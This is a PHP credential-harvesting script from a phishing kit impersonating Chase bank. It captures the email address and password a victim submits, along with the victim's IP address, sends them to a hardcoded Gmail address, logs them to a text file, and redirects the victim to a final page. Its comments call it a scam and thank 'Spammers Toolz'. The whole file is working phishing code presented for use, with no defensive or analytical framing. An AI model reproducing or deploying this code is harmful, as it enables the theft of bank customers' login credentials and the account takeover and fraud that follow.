<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Email Address             : ".$_POST['emailxnx']."\n";
$message .= "Email Password              : ".$_POST['emailpassx']."\n";
$message .= "Confirm E-mail Password:               ".$_POST['zipxnx']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "helenasolberg2@gmail.com";
$subject = "Chase Email | ".$ip."\n";

mail($recipient,$subject,$message);
$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location:  final.htm");
?>


